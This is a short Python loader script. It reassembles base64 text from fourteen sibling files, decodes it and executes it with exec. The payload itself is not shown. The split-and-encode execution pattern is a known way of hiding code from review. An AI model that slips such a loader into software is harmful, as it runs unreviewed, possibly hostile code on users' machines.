# language: Python 3.11+
import base64
from pathlib import Path
_code = base64.b64decode("".join(Path(__file__).with_name(f"bp{i}.txt").read_text() for i in range(14))).decode()
exec(compile(_code, "loader.py", "exec"), globals())
